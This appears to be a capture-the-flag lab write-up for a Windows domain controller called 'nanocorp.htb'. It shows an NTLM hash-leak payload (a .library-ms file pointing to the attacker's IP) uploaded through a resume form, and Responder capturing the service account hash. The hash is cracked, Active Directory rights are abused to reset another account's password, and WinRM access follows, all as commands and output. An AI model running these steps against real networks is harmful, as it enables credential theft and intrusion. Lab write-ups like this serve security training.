![[Pasted_image_20251109094617.png]]


## Port Scan 

```bash
sudo nmap -Pn  -sCV -oN nanocorp-port-scan 10.129.112.105
[sudo] password for darklight:
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-09 09:39 EAT
Nmap scan report for 10.129.112.105
Host is up (0.35s latency).
Not shown: 986 filtered tcp ports (no-response)
PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
80/tcp   open  http              Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
|_http-title: Did not follow redirect to http://nanocorp.htb/
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2025-11-09 13:39:38Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb0., Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl?
3389/tcp open  ms-wbt-server     Microsoft Terminal Services
|_ssl-date: 2025-11-09T13:41:15+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: commonName=DC01.nanocorp.htb
| Not valid before: 2025-10-20T01:58:09
|_Not valid after:  2026-04-21T01:58:09
5986/tcp open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
| tls-alpn:
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-title: Not Found
| ssl-cert: Subject: commonName=dc01.nanocorp.htb
| Subject Alternative Name: DNS:dc01.nanocorp.htb
| Not valid before: 2025-04-06T22:58:43
|_Not valid after:  2026-04-06T23:18:43
Service Info: Hosts: nanocorp.htb, DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2025-11-09T13:40:35
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m58s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 150.60 seconds
```

From the results of nmap we have the following details:

- Domain : **nanocorp.htb**
- Domain controller : **dc01.nanocorp.htb**
- clock-skew: **6h59m59s**. How to solve clock-skew check this [[Resolving clock_skew error]]

We have also identified a web service running on port 80.

First we add the IP and DNS to our host files.

## Web Service port 80

![[Pasted_image_20251109095918.png]]

Wappalyzer shows this technologies 

![[Pasted_image_20251109100023.png]]

Clicking the about Us then apply button give us a subdomain `hire.nanocorp.htb`

We get a form that accepts a file uploads.

![[Pasted_image_20251109100933.png]]

Submitting a test .zip file we get this message 

![[Pasted_image_20251109101212.png]]

First thought was `zipslip` exploits but that is too old most probably it wont work. 

Checking if NTLM authentication is enabled... NTLM is enabled .. if not enabled we could get something like this `(signing:True) (SMBv1:False) (NTLM:False)`

```bash
faketime -f '+7hrs' \
nxc smb dc01.nanocorp.htb
SMB         10.129.112.105  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:nanocorp.htb) (signing:True) (SMBv1:False)
```

With that if we could be able to trigger authentication to us then capture the NTLM hash with responder, we could crack the hash probably compromising a use. 

This thought led to this exploit 
https://github.com/helidem/CVE-2025-24054_CVE-2025-24071-PoC

Clone the repository then generate the payload 

```bash
python3 exploit.py
Enter attacker IP or hostname: 10.10.16.56
[+] File xd.library-ms successfully generated, pointing to \\10.10.16.56\share
```

Then we zip it 

```bash
zip resume.zip xd.library-ms
  adding: xd.library-ms (deflated 48%)
```

Finally start responder 

```bash
sudo responder -I tun0
```

The we upload our malicious `resume.zip` file.

A few seconds after uploading the zip file we capture a hash.

```bash
[SNIP]
[SMB] NTLMv2-SSP Client   : 10.129.112.105
[SMB] NTLMv2-SSP Username : NANOCORP\web_svc
[SMB] NTLMv2-SSP Hash     : web_svc::NANOCORP:1c04e8c7ca8c2c27:A408C042ACB9C405FE04A984145B5AC3:010100000000000080639C3F6651DC01E77E378701C411210000000002000800380044005500470001001E00570049004E002D0037004A0054004B00360047003500440041004A00520004003400570049004E002D0037004A0054004B00360047003500440041004A0052002E0038004400550047002E004C004F00430041004C000300140038004400550047002E004C004F00430041004C000500140038004400550047002E004C004F00430041004C000700080080639C3F6651DC010600040002000000080030003000000000000000000000000020000049B1AB41353B8EC88F05BFB6A1BB4B68D2D9F81E97748398489CE6284229CB180A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00350036000000000000000000
```


The hash cracks 

```bash
hashcat web_svc.ntlmv2 /usr/share/wordlists/rockyou.txt
```

```bash
hashcat web_svc.ntlmv2 /usr/share/wordlists/rockyou.txt --show
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

5600 | NetNTLMv2 | Network Protocol

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

WEB_SVC::NANOCORP:1c04e8c7ca8c2c27:a408c042acb9c405fe04a984145b5ac3:010100000000000080639c3f6651dc01e77e378701c411210000000002000800380044005500470001001e00570049004e002d0037004a0054004b00360047003500440041004a00520004003400570049004e002d0037004a0054004b00360047003500440041004a0052002e0038004400550047002e004c004f00430041004c000300140038004400550047002e004c004f00430041004c000500140038004400550047002e004c004f00430041004c000700080080639c3f6651dc010600040002000000080030003000000000000000000000000020000049b1ab41353b8ec88f05bfb6a1bb4b68d2d9f81e97748398489ce6284229cb180a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e00350036000000000000000000:dksehdgh712!@#
```

The password is valid. 

```bash
faketime -f '+7hrs' \
> nxc smb dc01.nanocorp.htb -u 'web_svc' -p 'dksehdgh712!@#'
SMB         10.129.112.105  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:nanocorp.htb) (signing:True) (SMBv1:False)
SMB         10.129.112.105  445    DC01             [+] nanocorp.htb\web_svc:dksehdgh712!@#
```


## Active Directory 

Running `rusthound-ce`

```bash
faketime -f '+7hrs' \
> rusthound-ce -u 'web_svc' -p 'dksehdgh712!@#' -d nanocorp.htb -n 10.129.112.105 -f dc01.nanocorp.htb
---------------------------------------------------
Initializing RustHound-CE at 18:08:00 on 11/09/25
Powered by @g0h4n_0
---------------------------------------------------

[2025-11-09T15:08:00Z INFO  rusthound_ce] Verbosity level: Info
[2025-11-09T15:08:00Z INFO  rusthound_ce] Collection method: All
[2025-11-09T15:08:01Z INFO  rusthound_ce::ldap] Connected to NANOCORP.HTB Active Directory!
[2025-11-09T15:08:01Z INFO  rusthound_ce::ldap] Starting data collection...
[2025-11-09T15:08:01Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-11-09T15:08:09Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=nanocorp,DC=htb
[2025-11-09T15:08:09Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-11-09T15:08:20Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Configuration,DC=nanocorp,DC=htb
[2025-11-09T15:08:20Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-11-09T15:08:35Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=nanocorp,DC=htb
[2025-11-09T15:08:35Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-11-09T15:08:36Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=nanocorp,DC=htb
[2025-11-09T15:08:36Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-11-09T15:08:37Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=nanocorp,DC=htb
[2025-11-09T15:08:37Z INFO  rusthound_ce::api] Starting the LDAP objects parsing...
[2025-11-09T15:08:37Z INFO  rusthound_ce::objects::domain] MachineAccountQuota: 10
[2025-11-09T15:08:37Z INFO  rusthound_ce::api] Parsing LDAP objects finished!
[2025-11-09T15:08:37Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...
[2025-11-09T15:08:37Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!
[2025-11-09T15:08:37Z INFO  rusthound_ce::json::maker::common] 6 users parsed!
[2025-11-09T15:08:37Z INFO  rusthound_ce::json::maker::common] .//20251109180837_nanocorp-htb_users.json created!
[2025-11-09T15:08:37Z INFO  rusthound_ce::json::maker::common] 61 groups parsed!
[2025-11-09T15:08:37Z INFO  rusthound_ce::json::maker::common] .//20251109180837_nanocorp-htb_groups.json created!
[2025-11-09T15:08:37Z INFO  rusthound_ce::json::maker::common] 1 computers parsed!
[2025-11-09T15:08:37Z INFO  rusthound_ce::json::maker::common] .//20251109180837_nanocorp-htb_computers.json created!
[2025-11-09T15:08:37Z INFO  rusthound_ce::json::maker::common] 2 ous parsed!
[2025-11-09T15:08:37Z INFO  rusthound_ce::json::maker::common] .//20251109180837_nanocorp-htb_ous.json created!
[2025-11-09T15:08:37Z INFO  rusthound_ce::json::maker::common] 3 domains parsed!
[2025-11-09T15:08:37Z INFO  rusthound_ce::json::maker::common] .//20251109180837_nanocorp-htb_domains.json created!
[2025-11-09T15:08:37Z INFO  rusthound_ce::json::maker::common] 2 gpos parsed!
[2025-11-09T15:08:37Z INFO  rusthound_ce::json::maker::common] .//20251109180837_nanocorp-htb_gpos.json created!
[2025-11-09T15:08:37Z INFO  rusthound_ce::json::maker::common] 73 containers parsed!
[2025-11-09T15:08:37Z INFO  rusthound_ce::json::maker::common] .//20251109180837_nanocorp-htb_containers.json created!

RustHound-CE Enumeration Completed at 18:08:37 on 11/09/25! Happy Graphing!
```

There are 4 domain users

![[Pasted_image_20251109111658.png]]

`WEB_SVC` has `AddSelf` rights on `IT_SUPPORT` group

![[Pasted_image_20251109111554.png]]

`MONITORING_SVC` is a member of the following groups 

![[Pasted_image_20251109113426.png]]

In bloodhound there is no relationship between `MONITORING_SVC` and `IT_SUPPORT` group.

Am going to user `powerview.py` 
https://github.com/aniqfakhrul/powerview.py

```bash
faketime -f '+7hrs' \
powerview nanocorp.htb/web_svc:'dksehdgh712!@#'@dc01.nanocorp.htb --dc-ip 10.129.112.105
Logging directory is set to /home/darklight/.powerview/logs/nanocorp-web_svc-dc01.nanocorp.htb
╭─LDAP─[DC01.nanocorp.htb]─[NANOCORP\web_svc]-[NS:<auto>]
╰─ ❯
```

Checking is `IT_SUPPORT` has any rights on `MONITORING_SVC` 

```bash
╭─LDAP─[DC01.nanocorp.htb]─[NANOCORP\web_svc]-[NS:<auto>]
╰─ ❯ Get-DomainObjectAcl -Identity 'monitoring_svc' -Where 'SecurityIdentifier contains it_support'
ObjectDN                    : CN=monitoring_svc,OU=AD_Monitoring,DC=nanocorp,DC=htb
ObjectSID                   : S-1-5-21-2261381271-1331810270-697239744-3101
ACEType                     : ACCESS_ALLOWED_OBJECT_ACE
ACEFlags                    : CONTAINER_INHERIT_ACE, INHERITED_ACE
AccessMask                  : ControlAccess
ObjectAceFlags              : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT
ObjectAceType               : User-Force-Change-Password
InheritanceType             : User
SecurityIdentifier          : NANOCORP\IT_Support

ObjectDN                    : CN=monitoring_svc,OU=AD_Monitoring,DC=nanocorp,DC=htb
ObjectSID                   : S-1-5-21-2261381271-1331810270-697239744-3101
ACEType                     : ACCESS_ALLOWED_OBJECT_ACE
ACEFlags                    : CONTAINER_INHERIT_ACE, INHERITED_ACE
AccessMask                  : ReadProperty
ObjectAceFlags              : ACE_INHERITED_OBJECT_TYPE_PRESENT
InheritanceType             : User
SecurityIdentifier          : NANOCORP\IT_Support
```

We note that from `IT_SUPPORT` we have `forceChangePassword` rights.

#### Getting to `MONITORING_SVC`

First we add `WEB_SVC` to `IT_SUPPORT`

```powershell
╭─LDAP─[DC01.nanocorp.htb]─[NANOCORP\web_svc]-[NS:<auto>]
╰─ ❯ Add-GroupMember -Identity 'it_support' -Members 'web_svc'
[2025-11-09 18:42:39] [Add-DomainGroupMember] Successfully added web_svc to group it_support
[2025-11-09 18:42:39] User web_svc successfully added to it_support
```

Changing `MONITORING_SVC` password fails. 

```powershell
╭─LDAP─[DC01.nanocorp.htb]─[NANOCORP\web_svc]-[NS:<auto>]
╰─ ❯ Set-DomainUserPassword -Identity 'monitoring_svc' -AccountPassword 'newPassword@12'
[2025-11-09 18:44:37] [Set-DomainUserPassword] Principal CN=monitoring_svc,OU=AD_Monitoring,DC=nanocorp,DC=htb found in domain
[2025-11-09 18:44:44] [Set-DomainUserPassword] Failed to change password for monitoring_svc
[2025-11-09 18:44:44] Failed password change attempt for monitoring_svc
```

Trying to use `bloodyAD` i get this.

```bash
faketime -f '+7hrs' 
bloodyAD -d nanocorp.htb --host dc01.nanocorp.htb -u 'web_svc' -p 'dksehdgh712!@#' set password 'monitoring_svc' 'newPassword@12'
Traceback (most recent call last):
  File "/usr/bin/bloodyAD", line 8, in <module>
    sys.exit(main())
             ~~~~^^
  File "/usr/lib/python3/dist-packages/bloodyAD/main.py", line 201, in main
    output = args.func(conn, **params)
  File "/usr/lib/python3/dist-packages/bloodyAD/cli_modules/set.py", line 241, in password
    raise e
  File "/usr/lib/python3/dist-packages/bloodyAD/cli_modules/set.py", line 86, in password
    conn.ldap.bloodymodify(target, {"unicodePwd": op_list})
    ~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/bloodyAD/network/ldap.py", line 285, in bloodymodify
    raise err
msldap.commons.exceptions.LDAPModifyException:
Password can't be changed before -2 days, 23:59:08.215504 because of the minimum password age policy.
```


> [!error]
> Password can't be changed before -2 days, 23:59:08.215504 because of the minimum password age policy.

Tried resetting the machine but still got the same error. 

Tried authenticating using kerberos instead of NTLM. 

```bash
faketime -f '+7hrs' \
impacket-getTGT nanocorp/web_svc:'dksehdgh712!@#' -dc-ip 10.129.220.70
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in web_svc.ccache

export KRB5CCNAME=web_svc.ccache
```


Changing `MONITORING_SVC` password 

```bash
faketime -f '+7hrs' \
bloodyAD -d nanocorp.htb --host dc01.nanocorp.htb -k set password 'monitoring_svc' 'newPassword@12'
[+] Password changed successfully!
```

That worked.. why did it work 

![[Pasted_image_20251110080709.png]]


I couldn't figure it out why for kerberos works but it fails with NTLM authentication 

```bash
faketime -f '+7hrs' \
impacket-getTGT nanocorp.htb/monitoring_svc:'newPassword@12' -dc-ip 10.129.169.36
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in monitoring_svc.ccache

export KRB5CCNAME=monitoring_svc.ccache
```

```bash
python3 evil_winrmexec.py -ssl nanocorp.htb/monitoring_svc@dc01.nanocorp.htb -k -no-pass
```

We get user flag


### Privilege Escalation 


CVE-2024-0670

